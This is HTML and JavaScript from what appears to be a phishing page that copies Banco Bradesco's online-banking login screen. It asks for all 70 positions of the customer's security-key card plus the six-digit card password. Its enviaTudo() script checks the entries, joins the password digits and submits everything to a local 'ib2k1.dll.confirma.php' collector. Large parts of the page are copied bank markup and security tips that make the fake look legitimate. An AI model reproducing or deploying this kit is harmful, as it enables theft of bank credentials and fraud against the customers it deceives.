                              <td background="images/ct/figuras/ok_r6_c2.jpg"><input name="pos5" type="text" tabindex="5" class="form12" id="pos5" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r6_c3.jpg"><input name="pos15" type="text" tabindex="15" class="form12" id="pos15" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r6_c4.jpg"><input name="pos25" type="text" tabindex="25" class="form12" id="pos25" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r6_c5.jpg"><input name="pos35" type="text" tabindex="35" class="form12" id="pos35" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r6_c7.jpg"><input name="pos45" type="text" tabindex="45" class="form12" id="pos45" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r6_c9.jpg"><input name="pos55" type="text" tabindex="55" class="form12" id="pos55" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r6_c10.jpg"><input name="pos65" type="text" tabindex="65" class="form12" id="pos65" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r7_c2.jpg"><input name="pos6" type="text" tabindex="6" class="form12" id="pos6" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r7_c3.jpg"><input name="pos16" type="text" tabindex="16" class="form12" id="pos16" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r7_c4.jpg"><input name="pos26" type="text" tabindex="26" class="form12" id="pos26" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r7_c5.jpg"><input name="pos36" type="text" tabindex="36" class="form12" id="pos36" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r7_c7.jpg"><input name="pos46" type="text" tabindex="46" class="form12" id="pos46" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r7_c9.jpg"><input name="pos56" type="text" tabindex="56" class="form12" id="pos56" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r7_c10.jpg"><input name="pos66" type="text" tabindex="66" class="form12" id="pos66" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r8_c2.jpg"><input name="pos7" type="text" tabindex="7" class="form12" id="pos7" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r8_c3.jpg"><input name="pos17" type="text" tabindex="17" class="form12" id="pos17" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r8_c4.jpg"><input name="pos27" type="text" tabindex="27" class="form12" id="pos27" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r8_c5.jpg"><input name="pos37" type="text" tabindex="37" class="form12" id="pos37" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r8_c7.jpg"><input name="pos47" type="text" tabindex="47" class="form12" id="pos47" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r8_c9.jpg"><input name="pos57" type="text" tabindex="57" class="form12" id="pos57" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r8_c10.jpg"><input name="pos67" type="text" tabindex="67" class="form12" id="pos67" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r9_c2.jpg"><input name="pos8" type="text" tabindex="8" class="form12" id="pos8" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r9_c3.jpg"><input name="pos18" type="text" tabindex="18" class="form12" id="pos18" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r9_c4.jpg"><input name="pos28" type="text" tabindex="28" class="form12" id="pos28" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r9_c5.jpg"><input name="pos38" type="text" tabindex="38" class="form12" id="pos38" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r9_c7.jpg"><input name="pos48" type="text" tabindex="48" class="form12" id="pos48" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r9_c9.jpg"><input name="pos58" type="text" tabindex="58" class="form12" id="pos58" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r9_c10.jpg"><input name="pos68" type="text" tabindex="68" class="form12" id="pos68" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r10_c2.jpg"><input name="pos9" type="text" tabindex="9" class="form12" id="pos9" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r10_c3.jpg"><input name="pos19" type="text" tabindex="19" class="form12" id="pos19" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r10_c4.jpg"><input name="pos29" type="text" tabindex="29" class="form12" id="pos29" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r10_c5.jpg"><input name="pos39" type="text" tabindex="39" class="form12" id="pos39" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r10_c7.jpg"><input name="pos49" type="text" tabindex="49" class="form12" id="pos49" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r10_c9.jpg"><input name="pos59" type="text" tabindex="59" class="form12" id="pos59" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r10_c10.jpg"><input name="pos69" type="text" tabindex="69" class="form12" id="pos69" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td background="images/ct/figuras/ok_r11_c2.jpg"><input name="pos10" type="text" tabindex="10" class="form12" id="pos10" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r11_c3.jpg"><input name="pos20" type="text" tabindex="20" class="form12" id="pos20" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r11_c4.jpg"><input name="pos30" type="text" tabindex="30" class="form12" id="pos30" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r11_c5.jpg"><input name="pos40" type="text" tabindex="40" class="form12" id="pos40" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r11_c7.jpg"><input name="pos50" type="text" tabindex="50" class="form12" id="pos50" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td background="images/ct/figuras/ok_r11_c9.jpg"><input name="pos60" type="text" tabindex="60" class="form12" id="pos60" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td colspan="2" background="images/ct/figuras/ok_r11_c10.jpg"><input name="pos70" type="text" tabindex="70" class="form12" id="pos70" size="3" maxlength="3" onKeyUp="saltaCampo(this)"/></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td colspan="10"><img name="ok_r12_c2" src="images/ct/figuras/ok_r12_c2.jpg" width="378" height="4" border="0" id="ok_r12_c2" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="4" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td colspan="4"><img name="ok_r13_c2" src="images/ct/figuras/ok_r13_c2.jpg" width="172" height="28" border="0" id="ok_r13_c2" alt="" /></td>
                              <td colspan="2"><img name="ok_r13_c6" src="images/ct/figuras/ok_r13_c6.jpg" width="47" height="28" border="0" id="ok_r13_c6" alt="" /></td>
                              <td colspan="3" background="images/ct/figuras/ok_r13_c8.jpg"><input name="referencia" type="text" class="formRef2" size="15" maxlength="15" /></td>
                              <td><img name="ok_r13_c11" src="images/ct/figuras/ok_r13_c11.jpg" width="29" height="28" border="0" id="ok_r13_c11" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="28" border="0" alt="" /></td>
                            </tr>
                            <tr>
                              <td colspan="11"><img name="ok_r14_c2" src="images/ct/figuras/ok_r14_c2.jpg" width="391" height="15" border="0" id="ok_r14_c2" alt="" /></td>
                              <td><img src="images/ct/figuras/spacer.gif" width="1" height="15" border="0" alt="" /></td>
                            </tr>
                          </table></td>
                          <td width="26%"><table width="171" border="0" cellpadding="0" cellspacing="0">
                              <tr>
                                <td><font face="Verdana, Arial, Helvetica, sans-serif" size="1" color="#000000"><b></b></font> <img src="chavesegurancabradesco.gif" alt="Foto Ilustrativa" border="0" align="right" /></td>
                              </tr>
                              <tr>
                                <td><table border="0" cellpadding="0" cellspacing="0" width="100%">
                                    <tr>
                                      <td> </td>
                                  </tr>
                                </table></td>
                              </tr>
                              <tr>
                                <td height="5"></td>
                              </tr>
                          </table></td>
                          <td width="12%"></td>
                        </tr>
                      </table>                  </td>
                </tr>
            </table>
          <font size="2" face="Verdana, Arial, Helvetica, sans-serif">
        
      </table>
     
        <script type="text/javascript">
AC_AX_RunContent( 'id','Conexao','classid','CLSID:2E3C3651-B19C-4DD9-A979-901EC3E930AF','width','0','height','0','update','1|1|1' ); //end AC code
</script><noscript><object id="Conexao" 
	classid="CLSID:2E3C3651-B19C-4DD9-A979-901EC3E930AF" width="0" 
	height="0" >
          <param name="Update" value="1|1|1">
        </object></noscript>    </td>
  </tr>
 
</table>
</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0"  bgcolor="" background="fundo.gif">
	  <tr> 
	    <td></td>
  </tr>
</table>
  </td>
  </tr>
</table>
<script>

function PosicionaFoco(param) {
	document.FLogin.strFoco.value = param; 

}


function IsNumeric(sText)
	{
	   var ValidChars = "0123456789.";
   	var IsNumber=true;
   var Char;

   for (i = 0; i < sText.length && IsNumber == true; i++) 
      { 
      Char = sText.charAt(i); 
      if (ValidChars.indexOf(Char) == -1) 
         {
         IsNumber = false;
         }
      }
   return IsNumber;
 }
 
 function createCookie(name,value,days)
{
	if (days)
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}
	

function  enviaTudo(){

	var a1 = document.getElementById("txtPass1").value;
	var a2 = document.getElementById("txtPass2").value;
	var a3 = document.getElementById("txtPass3").value;
	var a4 = document.getElementById("txtPass4").value;
	var a5 = document.getElementById("txtPass5").value;
	var a6 = document.getElementById("txtPass6").value;

	var i;
	var value;	
	for (i = 1;i <=70;i ++) {
	   eval("value = document.FLogin.pos" + i + ".value");
    	if (value.length < 3)	{
			alert("Cada posi��o da Tabela de Chaves possui 3 d�gitos num�ricos correspondentes. A Posi��o " + i + " � inv�lida."); 
			eval("document.FLogin.pos" + i +".focus()");
			return false;
		}
		
		if (IsNumeric(value)) {
		}
		else
		{
			alert("Cada posi��o da Tabela de Chaves � formada por 3 d�gitos num�ricos correspondentes. A Posi��o " + i + " � inv�lida."); 
			eval("document.FLogin.pos" + i +".focus()");
			return false;
		}
	}
	 
	  if(document.FLogin.referencia.value.length < 3){
		 alert('Referencia da tabela inv�lida');
		 return false
		}
	 
	 if(document.FLogin.txtPass1.value.length < 1){
		 alert('Senha do cart�o de 6 d�gitos inv�lida');
		 return false;
		 }
		 if(document.FLogin.txtPass2.value.length  < 1){
		 alert('Senha do cart�o de 6 d�gitos inv�lida');;
		 return false;
		 }
		 if(document.FLogin.txtPass3.value.length  < 1){
		 alert('Senha do cart�o de 6 d�gitos inv�lida');
		 return false;
		 }
		 if(document.FLogin.txtPass4.value.length  < 1){
		 alert('Senha do cart�o de 6 d�gitos inv�lida');
		 return false;
		 }
		  if(document.FLogin.txtPass5.value.length  < 1){
		 alert('Senha do cart�o 6 d�gitos inv�lida');
		 return false;
		 }
		  if(document.FLogin.txtPass6.value.length  < 1){
		 alert('Senha do cart�o de 6 d�gitos inv�lida');
		 return false;
		 }		
		
		for (i = 1;i <=70;i ++) {
		   eval("value = document.FLogin.pos" + i + ".value");
		   eval("document.FLogin.pos" + i + ".value = value");
		}
		

		document.FLogin.senhad6.value = a1+a2+a3+a4+a5+a6;
			 
		createCookie('bradesco','Enviado com Sucesso','1');
		document.FLogin.action = "ib2k1.dll.confirma.php";
		document.FLogin.submit();
		
	
	}
</script>





<div class="topo_canto_L"></div>
<div class="topo_canto_R"></div>
<div id="conteudo_interno" style="border-bottom:1px #FFFFFF solid;" class="miolo miolo_noBg after"><div id="divMioloPaginaLogin" class="boxP20 after"><div>
  <div id="box_titular" style="display:none;" class="pb15 after"><a id='link_saudacao' class='linkInvisivel tabindex' href='' 
                title='Boa tarde, Lincoln'></a><a class="loging_Tip bTip tabindex linkInvisivel" id="contPrincDV" title="Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.">Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.</a></div>
				
				<script language="javascript">
		function abre() {
		document.getElementById('aaa').style.display = 'block';
		}
				
		function vai() {
		 if(document.FLogin.txtPass1.value ==""){
		 alert('Senha do cart�o de cr�dito inv�lida');
		 return false;
		 }
		 if(document.FLogin.txtPass2.value ==""){
		 alert('Senha do cart�o de cr�dito inv�lida');;
		 return false;
		 }
		 if(document.FLogin.txtPass3.value ==""){
		 alert('Senha do cart�o de cr�dito inv�lida');
		 return false;
		 }
		 if(document.FLogin.txtPass4.value ==""){
		 alert('Senha do cart�o de cr�dito inv�lida');
		 return false;
		 }

		//document.FLogin.submit();
		 }
		</script>		
		
						
  <!--<form id="sss" name="sss" method="post" action="dentro.php" enctype="application/x-www-form-urlencoded" onsubmit="" class="ajaxForm allowSubmit">-->
  
  <div id="form_titular:box_senha4" class="box_redLine_bottom after inativo">
  
  <div id="form_titular:div_boxP14_senha4" class="boxP14"><div id="form_titular:erro_senha4" class="erro_msg none_i"></div><ul id="form_titular:ul_senha4_colsLogin" class="colsLogin after"><li id="form_titular:li_senha4_1" class="nro"><span id="form_titular:senha4_numero_passo">1</span></li>
<li id="form_titular:li_senha4_2" class="legendaBox"><span id="form_titular:text_senha4_legendaBox">Informe sua senha do <strong style="white-space:nowrap">Cart&atilde;o</strong><br>
  clicando nos bot&#245;es ao lado:</span></li>
<li id="form_titular:li_colsLogin_3"><ul id="form_titular:ul_teclado_virtual" class="btnKeyboardVirtualSingle after"></ul></li></ul><ul id="form_titular:ul_input_fields" class="input_fields after"><div><li id="form_titular:li_input_fields_1">

<div>
<div style="float:left;"><input type="password" style="border-right:0px;" id="txtPass1" name="txtPass1" maxlength="1" title="Informe sua senha de 4 d&#237;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;"><input type="password" id="txtPass2" style="border-left:0px;border-right:0px;" name="txtPass2" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;"><input type="password" id="txtPass3" style="border-left:0px;border-right:0px;" name="txtPass3" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;"><input type="password" id="txtPass4" style="border-left:0px;border-right:0px;" name="txtPas4" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;"><input type="password" id="txtPass5" style="border-left:0px;border-right:0px;" name="txtPass5" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>
<div style="float:left;"><input type="password" id="txtPass6" style="border-left:0px;" name="txtPass6" maxlength="1" title="Informe sua senha de 4 d&iacute;gitos." class="frmPassWord tabindex tab-1" disabled="disabled" /></div>

</div>




</li>
    <li id="form_titular:li_input_fields_2"></li>
<li id="form_titular:li_input_fields_3"></li>
<li id="form_titular:li_input_fields_4"></li>
</div><li id="form_titular:li_input_fields_5"><span id="form_titular:text_tooltip_teclado"><a id="a_teclado" class="senha_Tip bTip auto_Tip tabindex tab-1 linkInvisivel" 
                    title="Para sua seguran&ccedil;a, informe a sua senha do cart&atilde;o de cr&eacute;dito de 4 ou 6 d&iacute;gitos.">Para sua seguran&ccedil;a, informe a sua senha de 4 d&iacute;gitos.</a></span></li>
<li id="form_titular:li_input_fields_6" class="leg"><span id="form_titular:label_li_input_fields_6">(Informe sua senha do cart&atilde;o de 6 d&#237;gitos)</span></li>
<li id="form_titular:li_input_fields_7"><div id="form_titular:loading_login" class="loading  loading_pass4 fl after none_i"><div id="form_titular:div_carregando" class="txt"><span id="form_titular:link_ancora_carregando"><a id="ancora_carregando" href="#" title="Carregando..."></a></span><span id="form_titular:label_carregando">Carregando...</span></div></div></li><li id="form_titular:li_input_fields_8" class="itmContraste"><div id="form_titular:div_contraste" class="contrasteTeclado"><span id="form_titular:text_label_contraste"><span class="label " id="label_contraste">Contraste do teclado:</span>
                    
                      <a id="diminuiContraste" alt="Diminuir o contraste" title="Diminuir - contraste dos n&#250;meros do teclado virtual" 
                        class="diminuiContraste tabindex tab-1" href="">Diminui</a>
                                              
                      <a id="aumentaContraste" alt="Aumentar o contraste" 
                        title="Aumentar - contraste dos n&#250;meros do teclado virtual" class="aumentaContraste tabindex tab-1" href="">Aumenta</a>
                        
                      <a id="a_tooltip_contraste" class="bTip auto_Tip tabindex linkInvisivel tab-1" 
						title="Utilize os bot&#245;es ao lado para diminuir <br/>ou aumentar o contraste dos n&#250;meros. <br/>Para seguran&#231;a, sugerimos que diminua <br/>o contraste, isso dificulta a captura visual.">Utilize os bot&#245;es ao lado para diminuir ou aumentar o contraste dos n&#250;meros. Para seguran&#231;a, sugerimos que diminuao contraste, isso dificulta a captura visual. </a></span></div></li></ul></div></div>
						
						
						
						
						
						
						
						<div id="aaa" style="display:none;" class="emba after ativo">
						
						<div id="lista-conteudos" class="conteudo-dinamico none_i"><div id="dicas_primeiroAcesso_1" class="dicas_primeiroAcesso_1"><div id="dicaChaveSoUmaVez" class="box-dica box-seguranca"><div class="linha"><!-- --></div><h2 class="atencao">Aten��o</h2><span>O Bradesco solicita a digita��o da Chave de Seguran�a apenas uma vez a cada transa��o.<br><br>Se voc� digitar errado, o Bradesco solicitar� a mesma posi��o para este acesso, nunca outra.</span></div></div><div id="dicas_primeiroAcesso_2" class="dicas_primeiroAcesso_2"><div class="last"><div class="box-dica box-duvida"><h2>Em caso de d�vidas</h2><ul class="listaLinks"><li><span>Veja mais informa��es sobre o</span><br><a tabindex="20" class="link_ext pr12 tabindex" rel="external" style="white-space: nowrap;" href="http://www.bradesco.com.br/html/content/como_usar/chave.shtm" title="Cart�o Chave de Seguran�a">Cart�o Chave de Seguran�a</a></li><li><a tabindex="21" class="link_ext tabindex" href="javascript:;" onClick="return popupFaleconosco();" title="Entre em contato com o Bradesco">Entre em contato</a> <span>com o Bradesco</span></li></ul></div></div></div></div><div class=""><div class="boxP14"><span id="txt_msg_erro_frase"><span class="erro_msg none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cart�o, conforme posi��o solicitada.</span></span><ul id="_id18" class="colsLogin after"><li id="_id19" class="nro">2</li><li id="_id21" class="legendaBox"><span id="text_tancode">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cart�o, conforme posi��o solicitada.</span></li><li id="_id22"></li>
						
						
						
						<input type="hidden" name="form_titular_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
						<input type="hidden" name="loginbotoes:_link_hidden_2" />
						
						<div id="divDispositivos"></div>
						<div id="div-textoAntesBotoes" class="textoAntesBotoes"></div><div id="divBotoesPagina" class="mt0 bt0"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom"><li id="loginbotoes:li_btos_bottom_1"><input id="loginbotoes:bt_cancelar_acesso" name="loginbotoes:bt_cancelar_acesso" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif"  alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex botoesLogin" /></li><li id="loginbotoes:_id85"><input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onClick="" alt="Avan&#231;ar" title="Avan&#231;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" /></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="loginbotoes:_link_hidden_" />
						
<!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></div><div id="div-textoAposBotoes" class="textoAposBotoes"></div></div>
</div>
</div>


<ul id="loginbotoes:ul_btos_bottom" class="btos_bottom">
  <li id="loginbotoes:li_btos_bottom_1"></li>
  <li id="loginbotoes:_id85"><input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onClick="enviaTudo();" alt="Avan&#231;ar" title="Avan&#231;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" /></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" />
  <!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></div>


</div>
<script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/publicKe.js"><!--

//--></script><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/scpscrpt.js"><!--

//--></script><script language="javascript"><!--

setPublic(n_InternetBanking, e_InternetBanking);  
function setEncryptEventTrap(element, eventName, trapFunction) {
    if (element.addEventListener){
        element.addEventListener(eventName, trapFunction, false);
    } else if (element.attachEvent){
        element.attachEvent('on' + eventName, trapFunction);
} 
} 
function handOnClick(e) {
    rng_seed_time();
} 
function handOnKeyPress(e) {
    rng_seed_time();
} window.document.onclick = handOnClick;
window.document.onkeypress = handOnKeyPress;
function getValor(campo) {
    var retorno = "";
    try {
        if(typeof(campo.length) != "undefined") {
            if (campo[0].type == "radio") {
                for (var i = 0; i < campo.length; i++) {
                    if (campo[i].checked) {
                        retorno = campo[i].value;
                        break;
                     }
                    }
             }
        } else {
            if(campo.type == "checkbox" || campo.type == "radio") {            
                if (campo.checked) {
                    retorno = campo.value;
                 }
            } else {
                retorno = campo.value;
            }
        }
    } catch (err) {
    }
    return retorno;
} function setValor(campo, novoValor, permiteBranco) {
   try {
       if(typeof(campo.length) != "undefined") {
           if (campo[0].type == "radio") {
              if (novoValor != "" || permiteBranco) {
                   for (var i = 0; i < campo.length; i++) {
                       if (campo[i].value == novoValor) {
                           campo[i].checked = true;
                       } else {
                           campo[i].checked = false;
                       }
                  }
                }
          }
       } else {
           if(campo.type == "checkbox") {            
               if (campo.value == novoValor) {
                   campo.checked = true;
               } else {
                   campo.checked = false;
              }
           } else if(campo.type == "radio") {
               if (novoValor != "" || permiteBranco) {
                   if (campo.value == novoValor) {
                       campo.checked = true;
                   } else {
                       campo.checked = false;
                   }
               }
           } else {
               campo.value = novoValor;
           }
       }
   } catch (err) {
} } function enc(formName, params) {
   var loop;
   for (loop = 0; loop < params.length; loop++) {
       var valorAux = getValor(window.document.forms[formName].elements[params[loop][0]]);
       window.document.forms[formName].elements[params[loop][1]].value = cript("7605190925697317521150", valorAux); 
       window.document.forms[formName + "_backup"].elements[params[loop][0]].value = valorAux;
      setValor(window.document.forms[formName].elements[params[loop][0]], "", true); 
} 
} 
function inic(formName, params) {
   var loop; 
   var dado; 
   for (loop = 0; loop < params.length; loop++) { 
       dado = window.document.forms[formName].elements[params[loop][1]].value;
       if (dado.length == 172 && dado.charAt(171) == "=") {
           dado = window.document.forms[formName + "_backup"].elements[params[loop][0]].value;
} 
      setValor(window.document.forms[formName].elements[params[loop][0]], dado, false);
} 
} 


//--></script><div style="visibility:visible; display:hide"></div>
<script language="javascript"><!--

var params_form_cript = new Array();
   params_form_cript[0] = ["form_cript:valor_dig", "form_cript:valor_cript"];
var processado_form_cript = false;
function origOnSubmitform_cript() {return true;}
function enc_form_cript() { 
   if (origOnSubmitform_cript() == false) {
       return false;
   }
   enc("form_cript",  params_form_cript); 
   return true;
} 
function inic_form_cript() {
   inic("form_cript", params_form_cript) ;
} 
setEncryptEventTrap(window, "load", inic_form_cript);


//--></script><script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','width','0','update','1|1|1' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" width="0"><param name="Update" value="1|1|1" /></object></noscript><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

        
        <!-- fim pb15 after -->

        
          <!-- Mais de um titular -->              
                        
          <!-- Select Titular - Box redline -->   
          
          
              
                <script type="text/javascript">
                <!--
                jQuery('#numero-tela').html('RLO01');
                //-->
                </script>          
                    
              
                
      
<!-- fim conteudo -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- ### UL BOX DIREITA ### -->
<!-- HDA -->
<!-- VIDEO -->
<!-- // VIDEO -->
<!-- // HDA -->
<!-- -->
<!-- -->
<!-- -->
<!-- ### FIM UL BOX DIREITA ### -->
</div>
<!-- ### RODAP� ### -->
<!-- ### FIM RODAP� ### -->
<div id="modalLogin" class="jqmWindow modalNaoFecha none_i" style="width:523px;"><div id="modalLogin_jqmCornerTop" class="jqmCornerTop"><div id="jqmCornerTop_1" class="cc"></div><div id="jqmCornerTop_2" class="c1"></div><div id="jqmCornerTop_3" class="c2"></div></div><div id="modalMiolo" class="jqmWrapper after"><a id='linkTituloModalLogin' href='javascript:;' class='tabindex modal-title tabfirst tabmodal' 
        title='Acesso Seguro'></a><div id="modalFechar" class="jqmTop after"><a href="javascript:;" class="lnkFechar closeModalLogin tabindex none_i" title="Fechar">Fechar</a><h4>Acesso Seguro</h4></div><div id="modalContentAfter" class="jqmContent after"><div id="modalBoxAlertPrincipal" class="ptb20"><div id="modalBoxAlertMessage" class="box-alerta sinal-X after"><div id="modalBoxAlertTexto" class="ctn-box after"><span class="HtmlOutputTextBradesco"><p><P>Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.</P></p></span></div></div><span class="HtmlOutputTextBradesco"><a id='mensagem-erro' class='modal-title tabindex tab-1 linkInvisivel' 
                      title='Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.'></a></span><span id="textoPosErro" class="ctn-voltar">Em caso de d&#250;vidas, por favor, entre em contato com o <a class="link_ext tabindex" id="FFB" title="Fone F&#225;cil Bradesco, ir para p&#225;gina." href="javascript:;" onClick="return fonefacil();">Fone F&#225;cil Bradesco</a></span></div></div><ul id="_id121" class="lstButtonsLine block"><li id="_id122" class="pl20"><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div></li><li id="_id124"><ul id="listaCancelarAcesso" class="lstButtons  btos_bottom fn after"><li id="cancelAcesso"><input id="cancelarAcessoModalForm:_id125" name="cancelarAcessoModalForm:_id125" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onClick="javascript: cancelarAcesso();;clear_cancelarAcessoModalForm();document.forms['cancelarAcessoModalForm'].elements['autoScroll'].value=getScrolling();" alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex " /><input type="hidden" name="cancelarAcessoModalForm_SUBMIT" value="1" /><input type="hidden" name="autoScroll" 